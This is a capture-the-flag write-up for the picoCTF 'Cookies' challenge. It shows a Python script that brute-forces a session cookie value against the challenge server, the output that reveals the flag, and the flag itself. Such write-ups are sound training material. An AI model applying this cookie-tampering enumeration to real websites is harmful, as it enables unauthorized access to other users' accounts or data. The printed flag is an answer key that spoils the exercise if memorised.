# 1. Cookies

> Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

## Solution:

The name of the challenge immediately gives away that this has something to do with browser cookies. Loading up the website, entering a random value (i chose `snickerdoodles` since it was the default) and going to the `Storage Tab -> Cookies` in developer settings, we do in fact see a cookie:
![[../screenshots/Cookie1.png]]
Trying out random phrases in the input field, we see that the cookie gets changed to a numeric value. After a lot of trial and error and searching around in the html files for any condition from which i could deduce the correct value for the cookie, I assumed that the best way to go forward is to just keep trying different values for the cookie. I made this script to do it:
```python
import requests

cookies = {'name':'1'}

while True:
    response = requests.get("http://mercury.picoctf.net:21485/check", cookies=cookies)
    print(f"Checking {cookies['name']}")
    text = response.text
    if "ctf{" in text.lower():
        print("=================FLAG FOUND===========================")
        print(text)
        break
    cookies['name'] = str(int(cookies['name']) + 1)
```

Sure enough, on cookie number 18:
```console
Checking 1
Checking 2
Checking 3
Checking 4
Checking 5
Checking 6
Checking 7
Checking 8
Checking 9
Checking 10
Checking 11
Checking 12
Checking 13
Checking 14
Checking 15
Checking 16
Checking 17
Checking 18
=================FLAG FOUND===========================
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```

In this response, we see the flag
## Flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
```

## Notes:
None

## Resources:
None


***

